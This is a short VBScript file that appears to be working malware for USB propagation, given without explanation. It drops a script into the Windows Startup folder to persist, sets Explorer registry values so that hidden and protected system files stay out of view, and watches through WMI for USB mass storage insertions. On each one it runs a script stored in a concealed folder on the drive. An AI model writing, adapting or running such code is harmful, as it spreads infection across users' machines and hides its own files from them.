On Error Resume Next
strComputer = "." '(Any computer name or address)
Set wmi = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set wmiEvent = wmi.ExecNotificationQuery("select * from __InstanceOperationEvent within 1 where TargetInstance ISA 'Win32_PnPEntity' and TargetInstance.Description='USB Mass Storage Device'") 
Set WshShell = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("1r2nv2.vbs") then
fs.DeleteFile("1r2nv2.vbs")
end If
If fs.FileExists("Windows Service.lnk") then
fs.DeleteFile("Windows Service.lnk")
end If
Path = WshShell.SpecialFolders("Startup")
X = fs.MoveFile("1r2nv2c.vbs", Path & "\")
Hidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
SHidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
St = WshShell.RegRead(Hidden)
If not St = 2 Then
WshShell.RegWrite Hidden, 2, "REG_DWORD"
WshShell.RegWrite SHidden, 0, "REG_DWORD"
End If
WshShell.SendKeys("{F5}")
While True
Set usb = wmiEvent.NextEvent()
Select Case usb.Path_.Class
Case "__InstanceCreationEvent"
do
Hidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
SHidden = "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
St = WshShell.RegRead(Hidden)
If not St = 2 Then
WshShell.RegWrite Hidden, 2, "REG_DWORD"
WshShell.RegWrite SHidden, 0, "REG_DWORD"
End If
Const Removable=1
For Each oDrive In fs.Drives
If oDrive.DriveType = Removable And oDrive.DriveLetter <> "A" Then
If fs.FolderExists(oDrive.DriveLetter & ":\Systems\ast") Then
Wshshell.run oDrive.DriveLetter & ":\Systems\ast\ast.vbs"
End If
WScript.Sleep(30000)
end if
next
loop
End Select
Wend